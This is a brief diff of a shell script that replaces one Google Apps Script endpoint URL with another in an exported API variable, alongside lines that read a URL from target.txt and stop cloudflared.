@@ -11,7 +11,7 @@ trimmed_url_data=$(echo "$url_data" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:
 
 export C=trimmed_url_data
 export URL=`cat target.txt`
-export API="https://script.google.com/macros/s/AKfycbxW2kPaa9hjfQL7r9zXHAqI9JRfZCB2U4vE2Xqcl_e27k8ZnOjAUojcjHTr45CwqObv/exec";
+export API="https://script.google.com/macros/s/AKfycbzyxdpKLalqiCrIPe1SBAC35DPRg7AJgq3gEDBsSbUtw6oDSV2FGgppwRsE7uNOFBhx/exec";
 
 pkill cloudflared
 
